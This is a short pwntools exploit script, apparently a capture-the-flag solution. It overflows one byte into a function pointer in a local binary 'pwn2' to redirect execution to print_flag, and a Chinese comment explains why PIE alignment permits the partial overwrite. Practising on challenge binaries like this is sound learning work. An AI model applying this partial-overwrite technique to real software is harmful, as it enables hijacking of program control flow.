'''
Author: Samrito
Date: 2022-03-06 15:17:45
LastEditors: Samrito
LastEditTime: 2022-03-06 15:39:27
'''
from pwn import *

context.log_level = 'debug'
context.arch = 'i386'
context.os = 'linux'


def debug(argv=''):
    gdb.attach(io, argv)
    pause()


io = process(argv=['./pwn2'])
payload = flat(
    [b'a' * (0x1e), b'\xd8']
)  #溢出一个字节到v3，v3原本为two函数地址，与print_flag地址只相差最后一个字节，可以修改。pie需要页对齐，因此不会影响地址最后一个字节的值
debug('b * select_func')
io.recvuntil(b'Which function would you like to call?\n')
io.sendline(payload)
io.interactive()
